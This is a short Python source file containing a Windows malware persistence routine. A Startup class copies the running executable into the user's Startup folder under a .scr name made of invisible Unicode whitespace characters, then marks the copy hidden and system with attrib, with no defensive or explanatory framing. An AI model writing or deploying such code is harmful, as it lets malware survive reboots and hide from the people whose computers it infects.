import os
import random
import shutil
import sys

class Startup:
    def __init__(self):
        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        while True:
            self.target_path = os.path.join(self.startup_path, "{}.scr".format("".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=5))))
            if not os.path.exists(self.target_path):
                break
        self.copy_to_startup()


    def get_self(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)

    def copy_to_startup(self):
        path, isExecutable = self.get_self()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup" or not isExecutable:
            return

        # Copy the file to the startup folder
        shutil.copy(source_path, self.target_path)
        os.system(f'attrib +h +s "{self.target_path}"')
    